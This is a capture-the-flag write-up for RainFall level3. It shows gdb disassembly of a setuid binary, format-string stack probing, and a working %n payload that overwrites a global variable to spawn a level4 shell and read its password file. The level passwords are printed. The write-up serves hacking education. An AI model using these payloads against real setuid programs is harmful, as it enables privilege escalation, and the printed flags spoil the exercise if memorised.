# Level3 - Format string vulnerability - Basic write

## Local script usage

```shell
Usage: ./main.sh
```

## Passwords and token

|        |                                                                    |
| ------ | ------------------------------------------------------------------ |
| level3 | `492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02` |
| level4 | `b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa` |

## Steps to resolve on VM

Note: We will use `gdb-peda`. You can setup peda with the script: [scripts/installPeda.sh](../../scripts/installPeda.sh)

1. Connect to `level3` user

```shell
ssh level3@$SNOW_HOST -p 4242
# Enter the password

ls -l
> -rwsr-s---+ 1 level4 users 5366 Mar  6  2016 level3
```

Notice there is a binary with level3 setuid and setgid.

2. Debug level3

Execute level3

```shell
./level3
(stdin) abcdef
> abcdef
```

Seems to be like level3

Lets debug the binary

```shell
(gdb) info functions

> (...)
  0x080484a4  v                                                                                                                           │id
  0x0804851a  main
  (...)
```

```shell
gdb-peda$ pdisas main
  0x0804851a <+0>:     push   %ebp
  0x0804851b <+1>:     mov    %esp,%ebp
  0x0804851d <+3>:     and    $0xfffffff0,%esp
  0x08048520 <+6>:     call   0x80484a4 <v>
  0x08048525 <+11>:    leave
  0x08048526 <+12>:    ret

gdb-peda$ pdisas v
  0x080484a4 <+0>:     push   %ebp
  0x080484a5 <+1>:     mov    %esp,%ebp
  0x080484a7 <+3>:     sub    $0x218,%esp
  0x080484ad <+9>:     mov    0x8049860,%eax
  0x080484b2 <+14>:    mov    %eax,0x8(%esp)
  0x080484b6 <+18>:    movl   $0x200,0x4(%esp)
  0x080484be <+26>:    lea    -0x208(%ebp),%eax
  0x080484c4 <+32>:    mov    %eax,(%esp)
  0x080484c7 <+35>:    call   0x80483a0 <fgets@plt>
  0x080484cc <+40>:    lea    -0x208(%ebp),%eax
  0x080484d2 <+46>:    mov    %eax,(%esp)
  0x080484d5 <+49>:    call   0x8048390 <printf@plt>
  0x080484da <+54>:    mov    0x804988c,%eax
  0x080484df <+59>:    cmp    $0x40,%eax
  0x080484e2 <+62>:    jne    0x8048518 <v+116>
  0x080484e4 <+64>:    mov    0x8049880,%eax
  0x080484e9 <+69>:    mov    %eax,%edx
  0x080484eb <+71>:    mov    $0x8048600,%eax
  0x080484f0 <+76>:    mov    %edx,0xc(%esp)
  0x080484f4 <+80>:    movl   $0xc,0x8(%esp)
  0x080484fc <+88>:    movl   $0x1,0x4(%esp)
  0x08048504 <+96>:    mov    %eax,(%esp)
  0x08048507 <+99>:    call   0x80483b0 <fwrite@plt>
  0x0804850c <+104>:   movl   $0x804860d,(%esp)
  0x08048513 <+111>:   call   0x80483c0 <system@plt>
  0x08048518 <+116>:   leave
  0x08048519 <+117>:   ret
```

```bash
~/level3 <<< %s%s%s%s%s%s%s%s%s%s%s%s
> Segmentation fault (core dumped)

~/level3 <<< "%08x.%08x.%08x.%08x.%08x\n"
> 00000200.b7fd1ac0.b7ff37d0.78383025.3830252e\n
```

We can show some parts of the stack memory by using a format string. This works, because we instruct the printf-function to retrieve five parameters from the stack and display them as 8-digit padded hexadecimal numbers.

```shell
level3@RainFall:~$ ./level3 <<< "AAAA.%p%p%p%p"
AAAA.0x2000xb7fd1ac00xb7ff37d00x41414141
level3@RainFall:~$ ./level3 <<< "AAAA.%4\$p"
AAAA.0x41414141

python -c 'print("A" * 40 + "%4\$n")'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%4\$n
b*v+40
b\*v+54
run <<< AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%4\$n
gdb-peda\$ x/x 0xbffff440
0xbffff440: 0x41

0x0804988c => \x8c\x98\x04\x08
b*v+54
run < <(python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%n"')

(echo `python -c 'print "\x8c\x98\x04\x08" + "%60x" + "%4$n"'` ; cat) | ~/level3
Wait what?!
id
> uid=2022(level3) gid=2022(level3) euid=2025(level4) egid=100(users) groups=2025(level4),100(users),2022(level3)
cat /home/user/level4/.pass
> b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

---

## Sources

### Format string vulnerability

- [Memory segmentation - Cheat sheet](https://www.0x0ff.info/wp-content/uploads/2015/12/buffer-overflow-memory-segmentation-cheat-sheet.png)

- [Format string attack - Introduction](https://owasp.org/www-community/attacks/Format_string_attack)
- [Exploit 101 - Format Strings](https://axcheron.github.io/exploit-101-format-strings/)
- [Exploiting Format String Vulnerabilities](https://cs155.stanford.edu/papers/formatstring-1.2.pdf)

### Shellcode

- []()

### C

- []()

### Shell

- [Man fgets](https://linux.die.net/man/3/fgets)
- [Man printf](https://linux.die.net/man/3/printf)
- [Man fwrite](https://linux.die.net/man/3/fwrite)
- [Man system](https://linux.die.net/man/3/system)
